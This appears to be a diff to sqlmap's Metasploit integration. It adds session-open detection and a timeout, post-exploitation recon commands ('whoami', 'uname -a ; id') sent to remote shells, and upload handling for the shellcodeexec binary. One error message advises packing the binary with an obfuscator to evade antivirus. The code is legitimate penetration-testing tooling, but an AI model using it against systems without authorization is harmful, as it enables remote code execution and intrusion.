@@ -30,7 +30,9 @@ from lib.core.enums import DBMS
 from lib.core.enums import OS
 from lib.core.exception import SqlmapDataException
 from lib.core.exception import SqlmapFilePathException
+from lib.core.exception import SqlmapGenericException
 from lib.core.settings import IS_WIN
+from lib.core.settings import METASPLOIT_SESSION_TIMEOUT
 from lib.core.settings import UNICODE_ENCODING
 from lib.core.subprocessng import blockingReadFromFD
 from lib.core.subprocessng import blockingWriteToFD
@@ -378,7 +380,7 @@ class Metasploit:
         logger.info(infoMsg)
 
         logger.debug("executing local command: %s" % self._cliCmd)
-        self._msfCliProc = execute(self._cliCmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
+        self._msfCliProc = execute(self._cliCmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, close_fds=False)
 
     def _runMsfCli(self, exitfunc):
         self._forgeMsfCliCmd(exitfunc)
@@ -388,7 +390,7 @@ class Metasploit:
         logger.info(infoMsg)
 
         logger.debug("executing local command: %s" % self._cliCmd)
-        self._msfCliProc = execute(self._cliCmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
+        self._msfCliProc = execute(self._cliCmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, close_fds=False)
 
     def _runMsfShellcodeRemote(self):
         infoMsg = "running Metasploit Framework shellcode "
@@ -443,8 +445,9 @@ class Metasploit:
             send_all(proc, "getuid\n")
 
     def _controlMsfCmd(self, proc, func):
+        initialized = False
+        start_time = time.time()
         stdin_fd = sys.stdin.fileno()
-        initiated_properly = False
 
         while True:
             returncode = proc.poll()
@@ -461,7 +464,7 @@ class Metasploit:
                     timeout = 3
 
                     inp = ""
-                    start_time = time.time()
+                    _ = time.time()
 
                     while True:
                         if msvcrt.kbhit():
@@ -472,13 +475,13 @@ class Metasploit:
                             elif ord(char) >= 32:   # space_char
                                 inp += char
 
-                        if len(inp) == 0 and (time.time() - start_time) > timeout:
+                        if len(inp) == 0 and (time.time() - _) > timeout:
                             break
 
                     if len(inp) > 0:
                         try:
                             send_all(proc, inp)
-                        except IOError:
+                        except (EOFError, IOError):
                             # Probably the child has exited
                             pass
                 else:
@@ -487,20 +490,12 @@ class Metasploit:
                     if stdin_fd in ready_fds[0]:
                         try:
                             send_all(proc, blockingReadFromFD(stdin_fd))
-                        except IOError:
+                        except (EOFError, IOError):
                             # Probably the child has exited
                             pass
 
                 out = recv_some(proc, t=.1, e=0)
                 blockingWriteToFD(sys.stdout.fileno(), out)
-
-                # Dirty hack to allow Metasploit integration to be tested
-                # in --live-test mode
-                if initiated_properly and conf.liveTest:
-                    try:
-                        send_all(proc, "exit\n")
-                    except TypeError:
-                        continue
 
                 # For --os-pwn and --os-bof
                 pwnBofCond = self.connectionStr.startswith("reverse")
@@ -512,24 +507,35 @@ class Metasploit:
                 if pwnBofCond or smbRelayCond:
                     func()
 
-                if "Starting the payload handler" in out and "shell" in self.payloadStr:
-                    if Backend.isOs(OS.WINDOWS):
-                        send_all(proc, "whoami\n")
+                timeout = time.time() - start_time > METASPLOIT_SESSION_TIMEOUT
+
+                if not initialized:
+                    match = re.search("session ([\d]+) opened", out)
+
+                    if match:
+                        self._loadMetExtensions(proc, match.group(1))
+
+                        if "shell" in self.payloadStr:
+                            send_all(proc, "whoami\n" if Backend.isOs(OS.WINDOWS) else "uname -a ; id\n")
+                            time.sleep(2)
+
+                        initialized = True
+
+                    elif timeout:
+                        proc.kill()
+                        errMsg = "timeout occurred while attempting "
+                        errMsg += "to open a remote session"
+                        raise SqlmapGenericException(errMsg)
+
+                if conf.liveTest and timeout:
+                    if initialized:
+                        send_all(proc, "exit\n")
+                        time.sleep(2)
                     else:
-                        send_all(proc, "uname -a ; id\n")
+                        proc.kill()
 
-                    time.sleep(2)
-                    initiated_properly = True
-
-                metSess = re.search("Meterpreter session ([\d]+) opened", out)
-
-                if metSess:
-                    self._loadMetExtensions(proc, metSess.group(1))
-
-            except EOFError:
-                returncode = proc.wait()
-
-                return returncode
+            except (EOFError, IOError):
+                return proc.returncode
 
     def createMsfShellcode(self, exitfunc, format, extra, encode):
         infoMsg = "creating Metasploit Framework multi-stage shellcode "
@@ -543,7 +549,7 @@ class Metasploit:
         self._forgeMsfPayloadCmd(exitfunc, format, self._shellcodeFilePath, extra)
 
         logger.debug("executing local command: %s" % self._payloadCmd)
-        process = execute(self._payloadCmd, shell=True, stdout=None, stderr=PIPE)
+        process = execute(self._payloadCmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, close_fds=False)
 
         dataToStdout("\r[%s] [INFO] creation in progress " % time.strftime("%X"))
         pollProcess(process)
@@ -579,19 +585,30 @@ class Metasploit:
 
         __basename = "tmpse%s%s" % (self._randStr, ".exe" if Backend.isOs(OS.WINDOWS) else "")
 
-        if web:
-            self.shellcodeexecRemote = "%s/%s" % (self.webDirectory, __basename)
-        else:
-            self.shellcodeexecRemote = "%s/%s" % (conf.tmpPath, __basename)
-
+        self.shellcodeexecRemote = "%s/%s" % (conf.tmpPath, __basename)
         self.shellcodeexecRemote = ntToPosixSlashes(normalizePath(self.shellcodeexecRemote))
 
         logger.info("uploading shellcodeexec to '%s'" % self.shellcodeexecRemote)
 
         if web:
-            self.webUpload(self.shellcodeexecRemote, self.webDirectory, filepath=self.shellcodeexecLocal)
+            written = self.webUpload(self.shellcodeexecRemote, os.path.split(self.shellcodeexecRemote)[0], filepath=self.shellcodeexecLocal)
         else:
-            self.writeFile(self.shellcodeexecLocal, self.shellcodeexecRemote, "binary")
+            written = self.writeFile(self.shellcodeexecLocal, self.shellcodeexecRemote, "binary", forceCheck=True)
+
+        if written is not True:
+            errMsg = "there has been a problem uploading shellcodeexec, it "
+            errMsg += "looks like the binary file has not been written "
+            errMsg += "on the database underlying file system or an AV has "
+            errMsg += "flagged it as malicious and removed it. In such a case "
+            errMsg += "it is recommended to recompile shellcodeexec with "
+            errMsg += "slight modification to the source code or pack it "
+            errMsg += "with an obfuscator software"
+            logger.error(errMsg)
+
+            return False
+        else:
+            logger.info("shellcodeexec successfully uploaded")
+            return True
 
     def pwn(self, goUdf=False):
         if goUdf:
